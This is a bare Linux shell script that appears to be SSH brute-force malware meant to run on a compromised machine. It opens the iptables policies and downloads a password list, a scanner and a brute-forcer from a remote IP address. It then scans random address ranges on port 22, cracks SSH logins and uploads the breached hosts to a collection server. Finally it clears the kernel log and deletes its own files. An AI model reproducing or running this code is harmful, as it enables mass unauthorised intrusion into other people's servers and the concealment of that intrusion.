if ( test -e /tmp/rand_scan_a.sh )
then
rm -f /tmp/rand_scan_b.sh
exit
fi

cpu=`cat /proc/cpuinfo |grep processor |wc -l`
let bru=$cpu*50
echo CPU $cpu
if [ "$cpu" -lt "2" ] 
then
	echo Not CPU
	rm -f /tmp/bios.txt /tmp/rand_scan_*.sh /tmp/result.txt /tmp/vuln.txt /tmp/ss /tmp/brutessh /tmp/pass_file /tmp/core*.*
	exit
fi


#apt-get install curl -y
#yum install curl -y



if ( test -e /usr/bin/curl )
then
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
#iptables -F
cd /tmp/
wget 68.234.15.61/bru/pass_file -O pass_file
wget 68.234.15.61/bru/ss -O ss;chmod 755 ss
wget 68.234.15.61/bru/brutessh -O brutessh;chmod 755 brutessh 
# ./ss 22 -b 109.63 -s 10
# ./ss 22 -b 177.23 -s 10
# ./ss 22 -b 93.54 -s 10
# ./ss 22 -b 110.36 -s 10
# ./ss 22 -b 154.0 -s 10
# ./ss 22 -b 2.228 -s 10
# ./ss 22 -b 131.117 -s 10
# ./ss 22 -b 37.17 -s 10
#./ss 22 -b 103.226 -s 10
#./ss 22 -b 109.63 -s 10
#./ss 22 -b 115.118 -s 10



number=$RANDOM
let "number %= 255"
echo $number

myip=`ifconfig eth0|grep "inet addr"|awk '{print $2}' |awk -F":" '{print $2}'`


seq 1 255 | while read name; do 
	./ss 22 -b $number.$name -s 10
	echo -n "Total "
	wc -l bios.txt
	mv -f bios.txt mfu.txt
	./brutessh $bru >>result.txt;
	rm -f bios.txt mfu.txt
	cat result.txt |grep Nu-ti |awk -F">" '{print $2}' >>vuln.txt
	split -l5000  vuln.txt temp_bios_
	ls temp_bios_*  | while read name; do 
		curl --url http://91.207.188.79:18000/save.php?ip=$myip -F submitname=OK  -F userfile=@$name
		#echo ssh_keyscan $name
		#cat $name | awk -F":" '{print $3}'| ssh-keyscan -T5 -t rsa -f - 2>finger.banner.1 1>finger.data.1
	done 
	rm -f temp_bios_* result.txt vuln.txt 
done
rm -f bios.txt rand_scan_b.sh result.txt vuln.txt ss brutessh pass_file /tmp/core*.*
fi
dmesg -c
sleep 10
killall ss brutessh
rm -f /tmp/finger.data.1 /tmp/finger.banner.1 /tmp/bios.txt /tmp/rand_scan_b.sh /tmp/result.txt /tmp/vuln.txt /tmp/ss /tmp/brutessh /tmp/pass_file /tmp/core*.*

exit
